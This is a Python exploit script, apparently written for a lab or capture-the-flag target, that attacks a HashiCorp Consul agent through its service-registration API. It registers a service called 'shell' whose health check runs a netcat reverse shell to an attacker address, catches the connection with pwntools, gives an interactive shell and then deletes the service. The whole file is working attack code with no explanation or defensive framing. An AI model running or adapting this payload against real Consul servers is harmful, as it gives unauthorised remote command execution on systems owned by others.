import requests
import json
from pwn import * #pip install pwn
import threading

lhost = "10.10.10.1"
lport = 443
rhost = "localhost"
acl_token = ""

def create_service():
	url = "http://{}:8500/v1/agent/service/register".format(rhost)

	headers = {
		"X-Consul-Token":acl_token,
		"Content-Type": "application/json"
	}

	payload = {
		"ID":"shell",
		"Name":"shell",
		"Address":"127.0.0.1",
		"Port":80,
		"Check":{
			"Args":["sh", "-c","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f".format(lhost,lport)],
			"Interval":"10s",
			"timeout":"86400s"
		}
	}

	data_to_send = json.dumps(payload).encode("utf-8")

	s = requests.put(url, data=data_to_send, headers=headers)

	if s.status_code == 200:
		print("[*] Service successfully created")
	else:
		print("[X] There was an error creating the service, retrying...")
		create_service()

def delete_service():
	url = "http://{}:8500/v1/agent/service/deregister/shell".format(rhost)

	headers = {
		"X-Consul-Token":acl_token,
		"Content-Type": "application/json"
	}

	s = requests.put(url, headers=headers)
	if s.status_code == 200:
		print("[*] Service successfully deleted")
	else:
		print("[X] There was an error deleting the service")

if __name__ == '__main__':
	try:
		threading.Thread(target=create_service, args=()).start()
	except Exception as e:
		log.error(str(e))

	p1 = log.progress("Creating 'shell' service on Consul")
	p1.status("Waiting for the shell")
	time.sleep(2)

	shell = listen(lport, timeout=20).wait_for_connection()

	if shell.sock is None:
		p1.failure("Failed to establish a connection")
	else:
		p1.success("Got a shell")

	time.sleep(10)
	shell.interactive()

	delete_service()
